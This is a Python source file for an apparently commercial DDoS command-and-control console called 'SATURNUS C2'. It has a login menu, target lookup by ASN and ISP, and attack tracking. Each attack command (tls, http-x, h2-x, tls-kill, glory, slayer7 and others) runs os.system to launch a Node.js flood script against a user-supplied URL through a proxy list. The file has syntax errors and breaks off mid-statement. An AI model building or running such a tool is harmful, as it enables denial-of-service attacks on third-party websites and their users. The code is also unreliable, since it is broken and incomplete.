# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
from colorama import Fore, Back
import os,sys,time as t,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

# Global variable for username
logged_in_user = None  # We'll store the username here after login
ongoing_attacks = []  # List to store ongoing attack details

def read_login_data(filename):
    try:
        with open(filename, "r") as file:
            login_data = {}
            for line in file:
                username, password = line.strip().split(":")
                login_data[username] = password
            return login_data
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
        return None
    except ValueError:
        print("Format data login tidak valid.")
        return None

def login(login_data):
    global logged_in_user  # Declare global variable to store logged-in username
    while True:
        os.system('clear')
        print("""
[ \033[36mSYSTEM\033[0m ] Welcome To SATURNUS🔥C2-API \033[36m@PUTRAx666\033[0m Enjoy Your Stay Here!
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[36m   _____  ___   ______ __  __ ____   _   __ __  __ _____\033[0m
\033[36m  / ___/ /   | /_  __// / / // __ \ / | / // / / // ___/\033[0m
\033[36m  \__ \ / /| |  / /  / / / // /_/ //  |/ // / / / \__ \ \033[0m
\033[36m ___/ // ___ | / /  / /_/ // _, _// /|  // /_/ / ___/ /\033[0m 
\033[36m/____//_/  |_|/_/   \____//_/ |_|/_/ |_/ \____/ /____/\033[0m  
                                                        
        🔥 \033[31mWELLCOME TO SATURNUS C2-API\033[0m 🔥
        
\033[35mTELEGRAM\033[0m : \033[36mT.ME/PUTRAx666\033[0m
\033[35mEXPIRY\033[0m : \033[36m2897.8 Millenium(s) left\033[0m
\033[35mLOG\033[0m : \033[36mSSH-2.0-libssh2_1.11.0\033[0m

Please Type "\033[36mHELP\033[0m" For More Information
------------------------------------------------------------------
""")
        username = input("Username » ")
        password = input("Password » ")
        if username in login_data and login_data[username] == password:
            logged_in_user = username  # Store the username of the logged-in user
            print(f"""
Login berhasil! Welcome, {username} 🪐!""")
            t.sleep(1)
            menu()
            main()
            return
        else:
            print("Username atau password salah. Silakan coba lagi.")
            t.sleep(1)

ip = requests.get('https://api.ipify.org').text.strip()

def methods():
    # Baca data dari file JSON
    with open('assets/methods.json', 'r') as file:
        methods_data = json.load(file)

    print(f"""                          Methods
 {'NAME'}     │ {'DESCRIPTION'}                   │ {'DURATION'} """)
    print('──────────┼───────────────────────────────┼──────────')
    for method in methods_data:
        print(f"{method['name']:<9} │ {method['description']:<29} │ {method['duration']:<3}")

# Fungsi untuk mendapatkan ISP, ASN, org, dan country berdasarkan IP menggunakan API ip-api.com
def get_ip_info(ip):
    try:
        # URL untuk mendapatkan data dari API ip-api.com
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
        
        # Mengirim permintaan ke API ip-api.com untuk mendapatkan data IP
        response = requests.get(url)
        data = response.json()

        # Cek apakah status API berhasil atau gagal
        if data['status'] != 'success':
            return 'Unknown ASN', 'Unknown ISP', 'Unknown Org', 'Unknown Country'  # Jika gagal, kembalikan 'Unknown'

        # Mengambil informasi ISP, ASN, org, dan country
        asn = data.get('as', 'Unknown ASN')  # ASN biasanya disediakan dalam format 'ASXXXX'
        isp = data.get('isp', 'Unknown ISP')
        org = data.get('org', 'Unknown Org')  # Organisasi yang memiliki IP ini
        country = data.get('country', 'Unknown Country')  # Negara yang terkait dengan IP

        return asn, isp, org, country
    except requests.RequestException as e:
        print(f"Error fetching ASN and ISP data: {e}")
        return 'ASN Unknown', 'ISP Unknown', 'Org Unknown', 'Country Unknown'  # Jika ada kesalahan dalam permintaan

# Fungsi untuk mengekstrak IP dari URL
def get_ip_from_url(url):
    try:
        # Menggunakan socket untuk mendapatkan IP dari URL (hostname)
        hostname = url.split("://")[-1].split("/")[0]  # Menangani http/https dan menghilangkan path
        ip = socket.gethostbyname(hostname)  # Mendapatkan IP dari hostname
        return ip
    except socket.gaierror:
        print(f"Error: Unable to resolve IP for URL {url}")
        return None

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b/%d/%Y")

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

# Fungsi untuk memperbarui status serangan secara otomatis
def update_attacks():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    while True:
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Tunggu beberapa detik sebelum mengecek kembali
        t.sleep(1)  # Bisa disesuaikan sesuai kebutuhan

# Fungsi untuk menampilkan serangan yang sedang berlangsung
def ongoing():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    if ongoing_attacks:
        print(f"""                      Running
 {'#'} │       {'HOST'}      │ {'SINCE'} │ {'DURATION'} │ {'METHOD'} """)
        print('───┼─────────────────┼───────┼──────────┼────────')

        # Memperbarui status serangan yang sudah selesai dan menghapusnya
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)  # Menambahkan serangan yang selesai ke list 'completed_attacks'
            else:
                attack['status'] = 'Ongoing'

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Menampilkan serangan yang sedang berlangsung
        for i, attack in enumerate(ongoing_attacks, 1):
            elapsed_time = int(t.time() - attack['start_time'])
            print(f" {i} │ {attack['host']:>15} │  {elapsed_time:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

        # Menampilkan serangan yang sudah selesai, jika ada
        for i, attack in enumerate(completed_attacks, 1):
            print(f" {i} │ {attack['host']:>15} │  {attack['duration']:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

    else:
        print("(cnc) No running attacks, why not start some?")

def myinfo():
    print(f"""username={logged_in_user}
concurrents=3
timelimit=500
cooldown=0
expiry=2897.8 Millenium(s) left
Myip={ip}:48970
Myclient=SSH-2.0-libssh2_1.11.0""")

def credits():
    print("""============CREDITS============
Version: 9.1
Creator: SATURNUS-C2
Website: Coming Soon
==============END==============""")

def help():
    print("""
USERS COMMAND
 🔥 HELP    ║ SHOW ALL COMMANDS
 🔥 CLS     ║ CLEAR AND BACK TO HOME
 🔥 METHODS ║ SHOW AMAZING ALL METHODS
 🔥 TOOLS   ║ SHOW CHECKHOST, PING, ETC
 🔥 HISTORY ║ SHOW ALL HISTORY ATTACKS
 🔥 MYINFO  ║ SHOW YOUR ACCOUNT INFORMATION
 🔥 ONGOING ║ VIEW RUNNING ATTACKS
 🔥 PASSWD  ║ CHANGE PASSWORD
 🔥 CHAT    ║ CHATTING WITH OTHER TEAM
 🔥 EXIT    ║ CLOSE YOUR SESSION
ADMINS COMMAND
 🔥 USERS   ║ USERS MENU
 🔥 ALERT   ║ ALERT TO USERS""")

def menu():
    os.system('clear')
    print(f"""
[ \033[36mSYSTEM\033[0m ] Welcome To SATURNUS🔥C2-API \033[36m@PUTRAx666\033[0m Enjoy Your Stay Here!
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[36m   _____  ___   ______ __  __ ____   _   __ __  __ _____\033[0m
\033[36m  / ___/ /   | /_  __// / / // __ \ / | / // / / // ___/\033[0m
\033[36m  \__ \ / /| |  / /  / / / // /_/ //  |/ // / / / \__ \ \033[0m
\033[36m ___/ // ___ | / /  / /_/ // _, _// /|  // /_/ / ___/ /\033[0m 
\033[36m/____//_/  |_|/_/   \____//_/ |_|/_/ |_/ \____/ /____/\033[0m  
                                                        
        🔥 \033[31mWELLCOME TO SATURNUS C2-API\033[0m 🔥
        
\033[35mTELEGRAM\033[0m : \033[36mT.ME/PUTRAx666\033[0m
\033[35mEXPIRY\033[0m : \033[36m2897.8 Millenium(s) left\033[0m
\033[35mLOG\033[0m : \033[36mSSH-2.0-libssh2_1.11.0\033[0m

Please Type "\033[36mHELP\033[0m" For More Information
------------------------------------------------------------------
""")

def main():
    global ongoing_attacks
    threading.Thread(target=update_attacks, daemon=True).start()
    while True:
        sys.stdout.write(f"\x1b]2;0 boats | Succubus Custom Build | Serving {logged_in_user} | Active Sessions 2 | 2983.8 Millenium(s)\x07")
        sin = input(f"\033[7m\033[31m{logged_in_user}\033[0m\033[7m\033[34m|\033[0m\033[7m\033[36mPUTRA\x1b[1;40m\033[0m » \x1b[1;37m\033[0m")
        sinput = sin.split(" ")[0]
        if sinput == "cls" or sinput == "c":
            os.system('clear')
            menu()
        if sinput == "stop":
            ongoing_attacks = []  # Reset ongoing attacks when stop is typed
            menu()            
        if sinput == "help":
            help()
        if sinput == "myinfo" or sinput == "account" or sinput == "info":
            myinfo()
        if sinput == "methods":
            methods()
        if sinput == "ongoing":
            ongoing()
        if sinput == ""
        if sinput == "credits" or sinput == "whodoneit":
            credits()
        if sinput == "exit" or sinput == "goodbye" or sinput == "imaheadout":
            print("Goodbye !")
            break
        elif sinput == "404 Not Found":
            main()

#########LAYER-4 - 7########
        elif sinput == "TLS" or sinput == "tls":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tls',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node tls.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "Sat" or sinput == "sat":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'sat',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node Sat.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "tls-x" or sinput == "TLS-X":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tls-x',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node tlsv2.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "HTTP-X" or sinput == "http-x":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'http-x',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node HTTP-X.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "tls-kill" or sinput == "TLS-KILL":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tls-kill',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node tlskill.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "h2-x" or sinput == "H2-X":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'h2-x',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node h2-x.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "ninja" or sinput == "NINJA":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'ninja',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node ninja.js {url} {duration}')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "glory" or sinput == "GLORY":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'glory',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node glory.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "slayer7" or sinput == "SLAYER7":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'slayer7,
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node Slayer7.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "rapid" or sinput == "RAPID":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
